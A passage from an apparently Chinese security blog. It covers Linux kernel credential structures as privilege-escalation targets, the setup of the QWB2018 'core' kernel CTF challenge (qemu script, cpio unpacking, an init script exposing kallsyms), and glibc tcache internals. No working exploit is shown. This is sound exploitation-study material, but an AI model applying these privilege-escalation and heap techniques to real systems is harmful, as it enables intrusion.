CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个init_cred是一个具有最高权限的cred,可以考虑使用它或者其拷贝进行提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_creds - Prepare a new set of credentials for modification</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a new set of task credentials for modification.  A task&#x27;s creds</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t generally be modified directly, therefore this function is used to</span></span><br><span class="line"><span class="comment"> * prepare a new copy, which the caller then modifies and then commits by</span></span><br><span class="line"><span class="comment"> * calling commit_creds().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Preparation involves making a copy of the objective creds for modification.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns a pointer to the new creds-to-be if successful, NULL otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call commit_creds() or abort_creds() to clean up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	validate_process_creds();</span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(new, old, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line"></span><br><span class="line">	new-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(new-&gt;session_keyring);</span><br><span class="line">	key_get(new-&gt;process_keyring);</span><br><span class="line">	key_get(new-&gt;thread_keyring);</span><br><span class="line">	key_get(new-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	new-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(new);</span><br><span class="line">	<span class="keyword">return</span> new;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	abort_creds(new);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure>







<h3 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018-core"></a>强网杯2018-core</h3><p>给了四个东西bzImage  core.cpio  start.sh  vmlinux,其中</p>
<p>bzImage是内核镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (simple@vps-simple) <span class="comment">#19 SMP Mon Mar 19 18:50:28 CST 2018, RO-rootFS, swap_dev 0x6, Normal VGA</span></span><br></pre></td></tr></table></figure>

<p>vmlinux是带符号表的elf文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1d8344e71a82bc43821029796ef65bebfe8e65c3, not stripped</span><br></pre></td></tr></table></figure>

<p><code>start.sh</code>是<code>qemu</code>启动内核的脚本,</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# <span class="built_in">cat</span> start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p><code>-initrd  ./core.cpio </code>指定使用<code>core.cpio</code>作为内存文件系统</p>
<p><code>kaslr </code>开启了内核地址随机化</p>
<p><code>-s</code> 开启了调试</p>
<p>解包core.cpio看看文件系统里有啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file core.cpio</span><br><span class="line">core.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix</span><br></pre></td></tr></table></figure>

<p>发现首先有一层gzip压缩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# mkdir core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cp core.cpio ./core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cd core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# mv core.cpio core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# gunzip core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# file core.cpio</span><br><span class="line">core.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>这时候已经没有gzip包了,是一个cpio归档文件,解包用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# cpio -idm &lt; core.cpio</span><br></pre></td></tr></table></figure>

<p>解包之后是一个linux目录树,值得注意的是根目录下有两个shell脚本,gen_cpio.sh和init</p>
<p>这个gen_cpio.sh会递归查找当前目录为根的目录树打包成cpio归档文件,也就是制作文件系统用的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>其中有五条关键指令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms		//将kallsyms内核符号表拷贝到.tmp下面,这就意味着普通用户可以读取</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict		//不允许普通用户读取kallsyms内核符号</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict	//不允许普通用户读取dmesg内核消息</span><br><span class="line">insmod /core.ko			//加载了一个内核模块叫core	</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh		//当前用户<span class="built_in">id</span>为1000,不是root</span><br></pre></td></tr></table></figure>

<p>ida64打开core.ko看看是什么东西</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/28/tcache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/28/tcache/" class="post-title-link" itemprop="url">glibc2.27 tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-28 01:53:00 / Modified: 01:53:53" itemprop="dateCreated datePublished" datetime="2023-10-28T01:53:00+08:00">2023-10-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><p>glibc2.26之后</p>
<p>“如为死狂，则事无不成。”–&lt;&lt;最后的武士&gt;&gt;</p>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="comment">//根据tcache下标求解其中堆块的大小</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">//根据堆块大小求解对应tcache下标</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"><span class="comment">//根据堆块的mem区大小,首先计算得到堆块的整体大小(包括元数据)然后计算对应tcache下标</span></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>tcache桶子下标</th>
<th>mem大小范围</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x18</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>63</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="tcache-perthread-struct类定义"><a href="#tcache-perthread-struct类定义" class="headerlink" title="tcache_perthread_struct类定义"></a>tcache_perthread_struct类定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">//本堆块的mem区域第一个int被复用为next指针</span></span><br><span class="line"><span class="comment">//单向链表,next指针指向下一个空闲堆块的mem区域</span></span><br></pre></td></tr></table></figure>

<p>每个线程都有自己的tcache</p>
<p>也就是说,一个线程有一个<code>tcache_perthread_struct</code>结构体</p>
<p>counts[tidx]是计数器,记录tidx下标的tcache桶子中有几个堆块</p>
<p>entries[tidx]是链表头,指向tidx桶子中的第一个堆块</p>
<p>每个桶子中最多有<code>TCACHE_FILL_COUNT=7</code>个堆块,每个tcache_perthread_struct中有64个桶子</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20231027112655389.png" alt="image-20231027112655389"></p>
<h3 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><span class="comment">//将chunk放到tc_idx下标的tcache中</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//tcache_entry指针指向mem区,而不是基地址</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//tc_idx对应计数器自增</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span><span class="comment">//从tc_idx桶子中拿出一个堆块</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;<span class="comment">//线程死亡时释放这个线程的tcache,实际上调用free函数释放该线程的tcache中的堆块</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">    <span class="comment">//tcache_perthread_struct这个结构本身就是堆上分配的一个堆块</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><p>调用malloc的过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">	-&gt;libc_malloc</span><br><span class="line">		-&gt;use tcache</span><br><span class="line">		-&gt;int_malloc</span><br></pre></td></tr></table></figure>

<p>如果在libc_malloc中使用tcache能够完成分配,则不需要调用int_malloc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启用tcache后,分配过程宏观上看是这样的</span><br><span class="line">如果libc_malloc中,发现对应tcache中有合适的堆块,直接拿出来返回</span><br><span class="line">否则需要调用int_malloc,对bins中的堆块进行缓存和分类,然后返回</span><br></pre></td></tr></table></figure>



<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="libc_malloc"></a>libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span 